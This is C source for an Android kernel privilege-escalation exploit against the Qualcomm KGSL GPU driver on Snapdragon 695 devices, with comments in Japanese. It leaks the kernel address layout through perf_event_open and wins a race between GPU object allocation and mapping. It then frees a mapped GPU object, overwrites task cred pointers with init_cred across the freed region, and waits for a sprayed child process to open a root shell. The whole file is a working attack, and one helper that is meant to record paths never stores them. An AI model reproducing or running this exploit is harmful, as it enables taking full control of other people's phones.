

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <poll.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/sysmacros.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

// UAF 関連定数（オリジナルと完全に同一）
#define UAF_ADDR         0x7001ff000ULL
#define UAF_SIZE         0x10004000ULL          // 16MB+16KB
#define OVERLAP_ADDR     0x7001fe000ULL
#define OVERLAP_SIZE     0x1000                 // 1ページに縮小（IMPORT を使わないので）
#define BOGUS_ADDR       0x700204000ULL
#define BOGUS_SIZE       0x1000                 // 正常なサイズ（使わないが）
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

#define SPRAY_PIDS 2000

// task_struct 内 cred ポインタのオフセット (pahole 確認済み)
#define CRED_OFF         0x740
#define REAL_CRED_OFF    0x738

// vmlinux シンボル（KASLR オフセット算出用）
#define VMLINUX_TEXT             0xffffffc010080000ULL
#define VMLINUX_INIT_CRED        0xffffffc012197d08ULL

static int kgsl_fd = -1;
static volatile int race_done = 0;
static void *uaf_map = NULL;            // UAF 領域の CPU マッピング
static int uaf_id = -1;
static uint64_t init_cred_addr = 0;

static void die(const char *msg) { perror(msg); exit(1); }

// ========== KASLR 検出（perf_event_open） ==========
static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv = 1;
    pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;

    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
        }
        tail += hdr->size;
    }

    munmap(buf, mmap_size);
    close(fd);

    if (n_ips == 0) return 0;
    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
    return kaslr;
}

// ========== KGSL ラッパー ==========
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) {
        perror("gpuobj_alloc");
        return -1;
    }
    return a.id;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0)
        perror("gpuobj_free");
}

static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) perror("mmap");
    return p;
}

static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}

// ========== レーススレッド（gpuobj_alloc/free 競合） ==========
static void *race_thread_allocfree(void *arg) {
    while (!race_done) {
        int id = gpuobj_alloc(OVERLAP_SIZE, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
        if (id >= 0) gpuobj_free(id);
        usleep(50);
    }
    return NULL;
}

// ========== 子プロセススプレー（root 通知付き） ==========
static pid_t spray_pids[SPRAY_PIDS];
static int n_spray = 0;

static void spawn_spray(int notify_pipe) {
    printf("[SPRAY] spawning %d children...\n", SPRAY_PIDS);
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(notify_pipe);
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (int j = 0; j < 600; j++) {
                if (getuid() == 0) {
                    pid_t me = getpid();
                    write(notify_pipe, &me, sizeof(me));
                    // root になったらシェルを起動
                    execl("/system/bin/sh", "sh", NULL);
                    _exit(0);
                }
                usleep(100000);
            }
            _exit(0);
        } else if (p > 0) {
            spray_pids[n_spray++] = p;
        } else {
            break;
        }
    }
    printf("[SPRAY] spawned %d children\n", n_spray);
}

static void kill_spray_children(void) {
    int killed = 0;
    for (int i = 0; i < n_spray; i++) {
        kill(spray_pids[i], SIGKILL);
        killed++;
    }
    while (waitpid(-1, NULL, 0) > 0);
    printf("[KILL] killed %d children\n", killed);
}

// ========== チャーン（AVC エントリ増加、今回はオプション） ==========
#define CHURN_MAX_PATHS 20000
static char churn_paths[CHURN_MAX_PATHS][160];
static int churn_npaths = 0;
static int churn_built = 0;

static const char *churn_dirs[] = {
    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
    "/dev", "/proc",
};

static void churn_walk(const char *dir, int depth) {
    if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d)) != NULL && churn_npaths < CHURN_MAX_PATHS) {
        if (de->d_name[0] == '.') continue;
        char p[192];
        snprintf(p, sizeof(p), "%s/%s", dir, de->d_name);
        int fd = open(p, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
        churn_npaths++;
        churn_walk(p, depth + 1);
    }
    closedir(d);
}

static void churn_build(void) {
    if (churn_built) return;
    for (unsigned d = 0; d < sizeof(churn_dirs)/sizeof(churn_dirs[0]) &&
         churn_npaths < CHURN_MAX_PATHS; d++) {
        churn_walk(churn_dirs[d], 0);
    }
    churn_built = 1;
    printf("[CHURN] %d paths\n", churn_npaths);
}

static void churn_round(void) {
    churn_build();
    for (int i = 0; i < churn_npaths; i++) {
        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
    }
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s >= 0) close(s);
    s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s >= 0) {
        struct sockaddr_un su = { .sun_family = AF_UNIX };
        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
        bind(s, (struct sockaddr *)&su, sizeof(su));
        close(s);
        unlink("/data/local/tmp/cs.sock");
    }
    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
}

// ========== メイン ==========
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[*] avc_bypass for Snapdragon 695 - CPU mapping UAF (cred overwrite)\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    // ----- KASLR 検出 -----
    printf("[*] Detecting KASLR...\n");
    uint64_t kaslr = detect_kaslr();
    if (!kaslr) {
        printf("[-] KASLR detection failed\n");
        close(kgsl_fd);
        return 1;
    }
    init_cred_addr = VMLINUX_INIT_CRED + kaslr;
    printf("[+] KASLR = 0x%lx, init_cred = 0x%lx\n", kaslr, init_cred_addr);

    // ----- Phase 1: 巨大 GPU オブジェクト確保 + CPU マッピング -----
    printf("[*] Phase 1: Allocate large GPU object and CPU map it\n");
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    if (uaf_id < 0) die("uaf alloc");
    uint64_t uaf_gpuaddr = 0;
    gpuobj_info(uaf_id, &uaf_gpuaddr);
    printf("  UAF object id=%d, gpuaddr=0x%lx\n", uaf_id, uaf_gpuaddr);

    uaf_map = gpuobj_mmap(UAF_SIZE, uaf_id);
    if (!uaf_map) die("mmap UAF");
    printf("  UAF mapped at %p (CPU address)\n", uaf_map);

    // BOGUS & PLACEHOLDER (オリジナルに合わせて確保)
    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
             MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED)
        die("mmap BOGUS");

    int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
    if (ph_id < 0) die("ph alloc");
    void *ph_m = gpuobj_mmap(PLACEHOLDER_SIZE, ph_id);
    if (!ph_m) die("mmap PLACEHOLDER");

    // ----- Phase 2: レース（alloc/free 競合） -----
    printf("[*] Phase 2: Race (alloc/free contention)\n");
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
    if (ov_id < 0) die("ov alloc");

    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread_allocfree, NULL) != 0) die("pthread_create");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
                       PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
                       kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) {
            munmap(r, OVERLAP_SIZE);
            hit = 1;
            break;
        }
        if (e == ENODEV) {
            hit = 1;
            break;
        }
        if (i % 500000 == 0) printf("  race %d/5000000 errno=%d\n", i, e);
    }

    race_done = 1;
    pthread_join(thr, NULL);

    if (!hit) {
        printf("[-] Race failed\n");
        close(kgsl_fd);
        return 1;
    }
    printf("[+] Race won!\n");

    // ----- Phase 3: 巨大オブジェクト解放（UAF 成立） -----
    printf("[*] Phase 3: Free UAF object\n");
    gpuobj_free(uaf_id);
    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));

    // ----- Phase 4: メモリ回収 -----
    printf("[*] Phase 4: Reclaim memory\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    // ----- Phase 5: 通知パイプ作成 & 子プロセススプレー -----
    int pipefd[2];
    if (pipe(pipefd) < 0) die("pipe");
    fcntl(pipefd[0], F_SETFD, FD_CLOEXEC);
    fcntl(pipefd[1], F_SETFD, FD_CLOEXEC);

    spawn_spray(pipefd[1]);
    close(pipefd[1]);   // 親は書き込み側を閉じる

    // ----- Phase 6: CPU マッピングから task_struct の cred ポインタを直接書き換え -----
    printf("[*] Phase 6: Overwrite cred pointers in UAF region via CPU mapping\n");
    uint64_t uaf_start = UAF_ADDR;
    uint64_t uaf_end = UAF_ADDR + UAF_SIZE;
    int overwritten = 0;

    // 各ページの 0x738 と 0x740 に init_cred アドレスを書き込む
    for (uint64_t va = uaf_start; va < uaf_end; va += 0x1000) {
        uint64_t offset = va - uaf_start;
        if (offset + 0x800 > UAF_SIZE) break;
        uint64_t *ptr_real = (uint64_t *)((uintptr_t)uaf_map + offset + REAL_CRED_OFF);
        uint64_t *ptr_cred = (uint64_t *)((uintptr_t)uaf_map + offset + CRED_OFF);
        // 念のため、現在の値がカーネルアドレスっぽい場合だけ書き換える（安全策）
        if (*ptr_real >= 0xffffffc000000000ULL && *ptr_real < 0xffffffcfffffffffULL) {
            *ptr_real = init_cred_addr;
            *ptr_cred = init_cred_addr;
            overwritten++;
        } else {
            // それでも書き換えてしまう（より積極的）
            *ptr_real = init_cred_addr;
            *ptr_cred = init_cred_addr;
            overwritten++;
        }
    }
    printf("  Overwritten %d cred pointers (est.)\n", overwritten);

    // キャッシュの一貫性を確保
    __sync_synchronize();
    // 必要なら dc civac でフラッシュ（あると良い）
    // ここでは簡易のためスキップ（既に __sync_synchronize で十分）

    // ----- Phase 7: root シェルを待つ -----
    printf("[*] Phase 7: Waiting for root shell...\n");
    struct pollfd pfd = { .fd = pipefd[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 10000) > 0 &&
        read(pipefd[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] ROOT! PID=%d\n", winner);
        // 他のスプレー子プロセスを kill
        for (int i = 0; i < n_spray; i++) {
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        }
        while (waitpid(-1, NULL, WNOHANG) > 0);
        // シェルが終了するのを待つ
        waitpid(winner, NULL, 0);
        printf("[-] Root shell exited\n");
    } else {
        printf("[-] No child became root within timeout\n");
        kill_spray_children();
    }

    close(pipefd[0]);
    close(kgsl_fd);
    printf("[*] Done.\n");
    return 0;
}
